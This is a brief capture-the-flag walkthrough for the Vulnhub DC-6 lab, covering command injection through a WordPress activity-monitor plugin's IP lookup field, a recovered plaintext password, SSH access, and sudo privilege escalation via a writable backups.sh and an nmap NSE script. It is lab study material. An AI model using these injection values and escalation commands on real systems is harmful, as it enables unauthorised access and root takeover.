Vulnhub plugins: activity monitior
wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools
this place can exec bash when ip is x.x.x.x|bash_Command
and you can use lookup to exec it
we can find the file  poster.sh to see it

you will see mark's ~dir  has account and password of graham
pass:GSo7isUM1D4

you can ssh it
and get shell

sudo -l
graham has nopassword sudo exec to exec the backups.sh
ls -al
we can know the backups.sh can write by us
but vim can't found on it.
it's sad
so we can use echo to the file
echo "/bin/bash" >> backups.sh
and we can sudo it
as following command
sudo -u jens /home/jens/backups.sh

then we get another shell
-------------------------------
sudo -l 
do it again
we can find 
we can nopassword to exec the nmap
i got no idea
but nmap can use scripts on it
we create a new file of nse

-------------------------------
then we got like this
jens@dc-6:~$ echo "os.execute('/bin/bash')" >> new.nse
jens@dc-6:~$ ls
backups.sh  backups.tar.gz  new.nse
jens@dc-6:~$ cat new.nse
os.execute('/bin/bash')
jens@dc-6:~$ sudo /usr/bin/nmap --script=new.nse
